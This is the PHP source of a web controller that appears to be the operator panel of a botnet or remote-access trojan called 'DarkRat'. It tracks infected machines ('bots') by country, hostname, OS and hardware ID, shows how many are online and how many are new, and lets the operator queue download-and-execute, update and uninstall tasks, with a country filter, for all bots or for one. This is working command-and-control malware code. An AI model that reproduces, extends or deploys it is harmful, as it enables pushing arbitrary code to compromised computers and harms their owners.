<?php

class Main{
    public function __construct()
    {
        if(!empty($_COOKIE['identifier']) AND !empty($_COOKIE['securitytoken'])){
            $identifier = $_COOKIE['identifier'];
            $securitytoken = $_COOKIE['securitytoken'];

            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM securitytokens WHERE identifier = ?");
            $result = $statement->execute(array($identifier));
            $securitytoken_row = $statement->fetch();

            if(sha1($securitytoken) !== $securitytoken_row['securitytoken']) {
                //TODO Log Bruteforce?
                setcookie("identifier","",time()-(3600*24*365));
                setcookie("securitytoken","",time()-(3600*24*365));
                die('UPS: An error by Checking your Authentication');
            } else { //Token war korrekt
                //Setze neuen Token
                $neuer_securitytoken = $this->random_string();
                $insert = $GLOBALS["pdo"]->prepare("UPDATE securitytokens SET securitytoken = :securitytoken WHERE identifier = :identifier");
                $insert->execute(array('securitytoken' => sha1($neuer_securitytoken), 'identifier' => $identifier));
                setcookie("identifier",$identifier,time()+(3600*24*365)); //1 Jahr Gültigkeit
                setcookie("securitytoken",$neuer_securitytoken,time()+(3600*24*365)); //1 Jahr Gültigkeit

                //Logge den Benutzer ein
                $_SESSION['darkrat_userid'] = $securitytoken_row['user_id'];
            }
        }
    }

    public function index(){
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }
            //select count(*),now() as now  from bots where UNIX_TIMESTAMP(lastresponse) > UNIX_TIMESTAMP((now() + interval -3 minute))
            $sql = "SELECT *, UNIX_TIMESTAMP(lastresponse) as lastresponse, UNIX_TIMESTAMP(now()) as now FROM bots ORDER BY lastresponse DESC";
            $allbots = array();
            $botcount = 0;
            foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                $allbots[] = $row;
                $botcount++;
            }
             $sql = "SELECT country, count(*) as NUM FROM bots GROUP BY country";
             $return = array();
             foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                 $return[ strtolower( $row["country"])] = intval ($row["NUM"]);
             }
             //GET ONLINE CLIENTS
            $statement = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as online FROM bots WHERE UNIX_TIMESTAMP(lastresponse) + ? > UNIX_TIMESTAMP()");
            $result = $statement->execute(array('300')); //5 min.
            $onlinebotcount = $statement->fetch();
            //GET DEAD CLIENTS
            $statement = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as dead FROM bots WHERE UNIX_TIMESTAMP(lastresponse) + ? < UNIX_TIMESTAMP()");
            $result = $statement->execute(array('186400'));
            $deadbotcount = $statement->fetch();
            //New Clients in Last x Days
            $statement = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as count FROM bots WHERE UNIX_TIMESTAMP(install_date) + ? > UNIX_TIMESTAMP()");
            $result = $statement->execute(array('86400')); // 1 Day
            $lastclientscount = $statement->fetch();



            $GLOBALS["tpl"]->assign("allbots", $allbots);
            $GLOBALS["tpl"]->assign("worldmap", json_encode($return));
            $GLOBALS["tpl"]->assign("botcount", $botcount);
            $GLOBALS["tpl"]->assign("onlinebotcount", $onlinebotcount["online"]);
            $GLOBALS["tpl"]->assign("deadbotcount", $deadbotcount["dead"]);
            $GLOBALS["tpl"]->assign("lastclientscount", $lastclientscount["count"]);
        }

       private function random_string() {
            if(function_exists('random_bytes')) {
                $bytes = random_bytes(16);
                $str = bin2hex($bytes);
            } else if(function_exists('openssl_random_pseudo_bytes')) {
                $bytes = openssl_random_pseudo_bytes(16);
                $str = bin2hex($bytes);
            } else if(function_exists('mcrypt_create_iv')) {
                $bytes = mcrypt_create_iv(16, MCRYPT_DEV_URANDOM);
                $str = bin2hex($bytes);
            } else {
                //Bitte euer_geheim_string durch einen zufälligen String mit >12 Zeichen austauschen
                $str = md5(uniqid('euer_geheimer_string', true));
            }
            return $str;
        }

    public function tasks($botid = ""){
            $GLOBALS["template"][0] ="Main";
            $GLOBALS["template"][1] ="tasks";
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }
            if(!empty($_POST["delete"])){
                $statement =  $GLOBALS["pdo"]->prepare("DELETE FROM tasks WHERE id = ?");
                $statement->execute(array($_POST["taskid"]));
            }
            if(!empty($_POST["task"])) {
                $filter = array();
                $filter["onlybot"] = $botid;
                if(!empty($_POST["country-filter"])){
                    $filter["country"] = implode(', ', $_POST['country-filter']);
                }
                if($_POST["task"] == "uninstall") {
                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task) VALUES (?, ?, ?, ?)");
                    $statement->execute(array(json_encode($filter), 1, 'uninstall', $_POST["task"]));
                } elseif($_POST["task"] == "dande" || $_POST["task"] == "update") {
                    if(empty($_POST["command"])){
                        die("Please Input a Command");
                    }
                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task) VALUES (?, ?, ?, ?)");
                    $statement->execute(array(json_encode($filter), 1, $_POST["command"], $_POST["task"]));
                }
                header("refresh: 0");
            }
            if(!empty($_POST["taskid"]) && !empty($_POST["taskstatus"])) {
                if($_POST["taskstatus"] == "run"){
                    $taskstatus = 1;
                }else{
                    $taskstatus = 0;
                }
                $statement = $GLOBALS["pdo"]->prepare("UPDATE tasks SET status = ? WHERE id = ?");
                $statement->execute(array($taskstatus, $_POST["taskid"]));
                header("Refresh: 0");
            }
            $sql = "SELECT COUNT(tasks_completed.id) as executions, tasks.* FROM tasks LEFT JOIN tasks_completed ON tasks.id = tasks_completed.taskid GROUP BY tasks.id";
            $allTasks = array();
            foreach ($GLOBALS["pdo"]->query($sql) as $row) {
               $allTasks[] = $row;
            }
            $countries = array();
            foreach ($GLOBALS["pdo"]->query("SELECT country FROM bots") as $row) {
                $countries[] = $row["country"];
            }

            if($botid != ""){
                $GLOBALS["tpl"]->assign("showCountryFilter", "false");
            }else{
                $GLOBALS["tpl"]->assign("showCountryFilter", "true");
            }

            $GLOBALS["tpl"]->assign("allTasks", $allTasks);
            $GLOBALS["tpl"]->assign("countries", $countries);
        }

        public function login(){
            if(!empty($_SESSION["darkrat_userid"])){
                Header("Location: /dashboard");
            }
            if(!empty($_POST)){
                $username = $_POST['userid'];
                $passwort = $_POST['pswrd'];
                
                $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM users WHERE username = :username");
                $result = $statement->execute(array('username' => $username));
                $user = $statement->fetch();
                    
                //Überprüfung des Passworts
                if ($user !== false && password_verify($passwort, $user['passwort'])) {
                    $_SESSION['darkrat_userid'] = $user['id'];

                    if(isset($_POST['save_login'])) {
                        $identifier = $this->random_string();
                        $securitytoken = $this->random_string();

                        $insert = $GLOBALS["pdo"]->prepare("INSERT INTO securitytokens (user_id, identifier, securitytoken) VALUES (:user_id, :identifier, :securitytoken)");
                        $insert->execute(array('user_id' => $user['id'], 'identifier' => $identifier, 'securitytoken' => sha1($securitytoken)));
                        setcookie("identifier",$identifier,time()+(3600*24*365)); //1 Year
                        setcookie("securitytoken",$securitytoken,time()+(3600*24*365)); //1 Year
                    }

                    header("Location: /dashboard");
                } else {
                    $errorMessage = "Incorect Details<br>";
                }  
            }
        }

        public function taskdetails($id){
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }



            $GLOBALS["template"][0] ="Main";
            $GLOBALS["template"][1] ="taskdetails";
            $sql = "SELECT  COUNT(bots.id) as NUM, tasks_completed.bothwid, tasks_completed.status, tasks_completed.taskid, bots.country, bots.computrername, bots.operingsystem, tasks.task, tasks.command, tasks.filter, tasks.status as taskstatus FROM `tasks_completed` 
            LEFT JOIN bots ON tasks_completed.bothwid = bots.hwid
            LEFT JOIN tasks ON tasks_completed.taskid = tasks.id
            WHERE tasks_completed.taskid = ?";
            $tasks = array();
            $statement =  $GLOBALS["pdo"]->prepare($sql);
            $statement->execute(array($id));
            $worldmap = array();
            while($row = $statement->fetch(PDO::FETCH_ASSOC)) {
                $tasks[] = $row;
                $worldmap[ strtolower( $row["country"])] = intval ($row["NUM"]);
            }
            $countries = array();
            foreach ($GLOBALS["pdo"]->query("SELECT country FROM bots") as $row) {
                $countries[] = $row["country"];
            }
            $GLOBALS["tpl"]->assign("tasks", $tasks);
            $GLOBALS["tpl"]->assign("countries", $countries);
            $GLOBALS["tpl"]->assign("worldmap", json_encode($worldmap));
        }

        public function logout(){
            session_destroy();
            //Remove Cookies
            setcookie("identifier","",time()-(3600*24*365));
            setcookie("securitytoken","",time()-(3600*24*365));

            Header("Location: /login");
        }

        public function edituser($id){
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }
            $GLOBALS["template"][0] ="Main";
            $GLOBALS["template"][1] ="edituser";

            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM users WHERE id = ?");
            $result = $statement->execute(array($id));
            $user = $statement->fetch();
            $GLOBALS["tpl"]->assign("user", $user);
            if(!empty($_POST)){
                $passwort_hash = password_hash($_POST["password"], PASSWORD_DEFAULT);
                $statement = $GLOBALS["pdo"]->prepare("UPDATE users SET passwort = ? WHERE id = ?");
                $result = $statement->execute(array($passwort_hash,$id));
                header("refresh: 2");
                die("Success Please wait...");
            }
        }

        public function settings()
        {
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }
            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM users");
            $statement->execute(array());
            $users = $statement->fetchAll();

            $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
            $statementConfig->execute(array("1"));
            $config = $statementConfig->fetch();

           if(!empty($_POST)){

                if(!empty($_POST["enryptionkey"])){
                    $statement = $GLOBALS["pdo"]->prepare("UPDATE config SET enryptionkey = ? WHERE id = ?");
                    $result = $statement->execute(array($_POST["enryptionkey"],1));
                }

           }
            $GLOBALS["tpl"]->assign("users", $users);
            $GLOBALS["tpl"]->assign("config", $config);
        }
        public  function botinfo($id){
            if(empty($_SESSION["darkrat_userid"])) {
                die("Login Required");
            }
            $GLOBALS["template"][0] ="Main";
            $GLOBALS["template"][1] ="botinfo";
            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE id = ?");
            $result = $statement->execute(array($id));
            $GLOBALS["tpl"]->assign("botinfo", $statement->fetch(PDO::FETCH_ASSOC));
        }
}